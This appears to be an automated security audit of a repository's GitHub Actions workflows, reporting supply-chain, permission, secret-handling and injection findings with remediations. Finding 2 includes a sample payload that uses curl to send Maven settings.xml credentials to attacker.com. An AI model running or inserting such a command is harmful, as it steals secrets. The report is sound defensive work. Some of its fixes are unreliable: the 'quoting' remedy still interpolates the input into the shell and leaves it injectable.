# Security Audit Report

## Executive Summary

This document provides a comprehensive security audit of all GitHub Actions workflows in the artagon-workflows repository. The audit identifies security vulnerabilities, supply chain risks, and provides actionable remediation steps.

**Audit Date**: 2025-10-25
**Workflows Audited**: 17 workflow files
**Critical Issues**: 2
**High Issues**: 5
**Medium Issues**: 3

---

## Critical Issues

### 1. Mutable Action Version Tags (Supply Chain Risk)

**Severity**: CRITICAL
**Impact**: All workflows (17/17)
**CVSS**: 8.6 (High)

**Description**:
All workflows use mutable version tags (e.g., `@v4`, `@v3`, `@master`) instead of immutable commit SHAs. This creates a supply chain attack vector where:
- Attackers who compromise action repositories can move tags to malicious code
- Tag-based versions can change without notification
- No cryptographic verification of action integrity

**Affected Actions**:
```yaml
actions/checkout@v4                    # All workflows
actions/setup-java@v4                  # Maven, Java workflows
actions/cache@v4                       # All workflows
actions/upload-artifact@v4             # All workflows
codecov/codecov-action@v4              # CI workflows
softprops/action-gh-release@v1         # Release workflows
aquasecurity/trivy-action@master       # CRITICAL: using master branch!
github/codeql-action/upload-sarif@v3   # Security workflows
cachix/install-nix-action@v24          # C/C++/Bazel workflows
bazelbuild/setup-bazelisk@v2           # Bazel workflows
ilammy/msvc-dev-cmd@v1                 # Windows builds
dorny/test-reporter@v1                 # Test reporting
```

**Remediation**:
Pin all actions to specific commit SHAs with comments indicating the semantic version:
```yaml
# Pin: actions/checkout@v4.2.0
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

# Pin: actions/setup-java@v4.0.0
- uses: actions/setup-java@387ac29b308b003ca37ba93a6cab5eb57c8f5f93
```

**References**:
- [GitHub Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
- [OSSF Scorecard](https://github.com/ossf/scorecard)

---

### 2. Command Injection via User Inputs

**Severity**: CRITICAL
**Impact**: Multiple workflows
**CVSS**: 9.1 (Critical)

**Description**:
Several workflows pass user-controlled inputs directly into shell commands without proper sanitization, creating command injection vulnerabilities.

**Vulnerable Locations**:

1. **maven_ci.yml** (line 100, 104, 108):
```yaml
run: mvn clean verify -DskipTests ${{ inputs.maven-args }}
run: mvn clean verify ${{ inputs.maven-args }}
run: mvn clean verify -Partagon-oss-ci ${{ inputs.maven-args }}
```

2. **maven_release.yml** (line 151):
```yaml
run: mvn clean deploy -P${{ inputs.deploy-profile }} -DskipTests
```

3. **cmake_c_ci.yml** (line 100, 115):
```yaml
${{ inputs.cmake-options }}
```

**Attack Scenario**:
```yaml
# Malicious workflow_call
with:
  maven-args: '-DskipTests && curl attacker.com/exfil?data=$(cat ~/.m2/settings.xml)'
```

**Remediation**:
1. Validate inputs with regex patterns:
```yaml
inputs:
  maven-args:
    type: string
    pattern: '^[-A-Za-z0-9=.,_:/ ]*$'  # Allowlist pattern
```

2. Use proper quoting and escaping:
```yaml
run: |
  MAVEN_ARGS="${{ inputs.maven-args }}"
  mvn clean verify "$MAVEN_ARGS"
```

3. Consider using an action input schema validator

---

## High Severity Issues

### 3. Insufficient Permissions Scope

**Severity**: HIGH
**Impact**: 14/17 workflows
**Principle Violated**: Least Privilege

**Description**:
Most workflows don't define explicit `permissions:` blocks, defaulting to overly permissive access tokens. This violates the principle of least privilege.

**Workflows Without Permissions**:
- `maven_release.yml` - No permissions block (needs: contents:write, packages:write)
- `maven_deploy.yml` - No permissions block
- `cmake_c_ci.yml` - No permissions block
- `bazel_multi_ci.yml` - No permissions block
- `maven_security_scan.yml` - Missing `security-events: write` for SARIF upload

**Only 3/17 Workflows Have Permissions**:
- `maven_ci.yml` - ✓ Defines read-only permissions

**Remediation**:
Define minimal permissions for each workflow:

```yaml
permissions:
  contents: read        # Checkout code
  actions: read         # Download artifacts
  security-events: write # Upload SARIF (security workflows only)
  packages: write       # Deploy artifacts (release workflows only)
```

**Best Practice Template**:
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: read
    steps: [...]

  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write      # Create tags, releases
      packages: write      # Publish artifacts
    steps: [...]
```

---

### 4. Secret Exposure in Process Arguments

**Severity**: HIGH
**Impact**: `maven_release.yml`, `maven_deploy.yml`
**CWE**: CWE-214 (Invocation of Process Using Visible Sensitive Information)

**Description**:
GPG passphrase is passed via command-line argument, which can be visible in:
- Process listings (`ps aux`)
- Audit logs
- Error messages
- Core dumps

**Vulnerable Code** (`maven_release.yml:152`):
```yaml
run: |
  mvn clean deploy -P${{ inputs.deploy-profile }} -DskipTests \
    -Dgpg.passphrase="$GPG_PASSPHRASE"
```

**Remediation**:
Use environment variables or stdin instead:

```yaml
# Option 1: Maven settings.xml (preferred)
- name: Configure GPG
  run: |
    cat > ~/.m2/settings.xml <<EOF
    <settings>
      <servers>
        <server>
          <id>gpg.passphrase</id>
          <passphrase>${GPG_PASSPHRASE}</passphrase>
        </server>
      </servers>
    </settings>
    EOF
    chmod 600 ~/.m2/settings.xml

# Option 2: GPG preset passphrase (better)
- name: Preset GPG passphrase
  run: |
    echo "$GPG_PASSPHRASE" | gpg --batch --passphrase-fd 0 --pinentry-mode loopback
```

---

### 5. Untrusted Binary Downloads Without Verification

**Severity**: HIGH
**Impact**: `bazel_multi_ci.yml`
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Description**:
Buildifier binary is downloaded without checksum or signature verification.

**Vulnerable Code** (`bazel_multi_ci.yml:210-211`):
```yaml
- name: Setup Buildifier
  run: |
    wget -O /usr/local/bin/buildifier https://github.com/bazelbuild/buildtools/releases/download/v6.4.0/buildifier-linux-amd64
    chmod +x /usr/local/bin/buildifier
```

**Attack Scenario**:
- MITM attack on download
- Compromised GitHub release
- DNS poisoning

**Remediation**:
```yaml
- name: Setup Buildifier
  run: |
    BUILDIFIER_VERSION="6.4.0"
    BUILDIFIER_SHA256="be63db12899f48600bad94051123b1fd7b5251e7661b9168582ce52396132e92"

    wget -O /tmp/buildifier \
      "https://github.com/bazelbuild/buildtools/releases/download/v${BUILDIFIER_VERSION}/buildifier-linux-amd64"

    echo "${BUILDIFIER_SHA256}  /tmp/buildifier" | sha256sum --check

    sudo mv /tmp/buildifier /usr/local/bin/buildifier
    sudo chmod +x /usr/local/bin/buildifier
```

**Better Alternative**:
Use the official GitHub Action if available, or create a custom action with verified binaries.

---

### 6. Trivy Action Using @master Branch

**Severity**: HIGH
**Impact**: `maven_security_scan.yml`

**Description**:
Using `@master` for security-critical actions is extremely dangerous.

**Vulnerable Code** (`maven_security_scan.yml:80`):
```yaml
uses: aquasecurity/trivy-action@master
```

**Remediation**:
```yaml
# Pin: aquasecurity/trivy-action@0.28.0
uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b9c120bbb
```

---

### 7. Missing SARIF Upload Permissions

**Severity**: HIGH
**Impact**: `maven_security_scan.yml`

**Description**:
Workflow uploads SARIF to GitHub Security tab but doesn't request `security-events: write` permission.

**Remediation**:
```yaml
jobs:
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # Required for SARIF upload
```

---

## Medium Severity Issues

### 8. Git Configuration Using Generic Identity

**Severity**: MEDIUM
**Impact**: Release workflows

**Description**:
Commits created by workflows use generic "GitHub Actions" identity without bot indication.

**Current Code**:
```yaml
- name: Configure Git
  run: |
    git config user.name "GitHub Actions"
    git config user.email "actions@github.com"
```

**Remediation**:
```yaml
- name: Configure Git
  run: |
    git config user.name "artagon-bot[bot]"
    git config user.email "artagon-bot[bot]@users.noreply.github.com"
```

This makes it clear that commits are automated and follows GitHub's bot conventions.

---

### 9. Hard-Coded Versions in Workflows

**Severity**: MEDIUM
**Impact**: C/C++ workflows

**Description**:
Compiler and tool versions are hard-coded, making maintenance difficult.

**Examples**:
- `gcc-13`, `clang-18` hard-coded in multiple places
- Java version defaulting to `'25'` (may not be stable)

**Remediation**:
Create a centralized configuration file or use matrix versions:
```yaml
strategy:
  matrix:
    gcc-version: [11, 12, 13]
    clang-version: [16, 17, 18]
```

---

### 10. Insufficient Error Handling

**Severity**: MEDIUM
**Impact**: Multiple workflows

**Description**:
Many steps use `continue-on-error: true` which can mask important failures.

**Examples**:
- `maven_security_scan.yml` - All security scans have `continue-on-error: true`
- `cmake_c_ci.yml` - Static analysis failures are ignored

**Remediation**:
Only use `continue-on-error: true` for advisory checks, not security scans:
```yaml
- name: Run OWASP Dependency Check
  run: mvn org.owasp:dependency-check-maven:check
  # Remove: continue-on-error: true
  # Let it fail the build on vulnerabilities
```

---

## Recommendations

### Immediate Actions (Critical - Fix within 7 days)

1. **Pin all GitHub Actions to commit SHAs** with Dependabot monitoring
2. **Add input validation** to prevent command injection
3. **Fix Trivy action** to use pinned version instead of `@master`
4. **Add checksum verification** for buildifier download

### Short Term (High - Fix within 30 days)

5. **Add explicit permissions** to all workflows
6. **Fix GPG passphrase handling** to use environment variables
7. **Add `security-events: write`** to security scan workflow
8. **Review and minimize** `continue-on-error` usage

### Long Term (Medium - Fix within 90 days)

9. **Implement input validation schemas**
10. **Create centralized version management**
11. **Add workflow testing** (self-testing strategy)
12. **Implement Dependabot** for action updates

---

## Security Best Practices Checklist

- [ ] All actions pinned to commit SHAs
- [ ] Dependabot configured for action updates
- [ ] Explicit permissions on all workflows
- [ ] Input validation for all user-controllable inputs
- [ ] Secrets never exposed in command-line arguments
- [ ] Binary downloads verified with checksums
- [ ] No use of mutable branches (`@master`, `@main`)
- [ ] Security scan failures stop the build
- [ ] SARIF uploads have correct permissions
- [ ] Workflow testing implemented

---

## Tools for Ongoing Security

1. **actionlint** - Workflow linting and security checks
2. **Dependabot** - Automated action version updates
3. **OSSF Scorecard** - Repository security scoring
4. **GitHub Advanced Security** - Code scanning and secret scanning
5. **Trivy** - Container and dependency scanning

---

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OSSF Scorecard](https://github.com/ossf/scorecard)
- [OpenSSF Best Practices](https://bestpractices.coreinfrastructure.org/)
- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
- [Supply Chain Levels for Software Artifacts (SLSA)](https://slsa.dev/)

---

## Next Steps

1. Review and approve this security audit
2. Create GitHub issues for each critical and high severity item
3. Implement fixes in priority order
4. Set up Dependabot for ongoing monitoring
5. Establish periodic security review cadence (quarterly)

---

**Audit Completed By**: Claude Code (Automated Analysis)
**Audit Version**: 1.0
**Next Review**: 2026-01-25
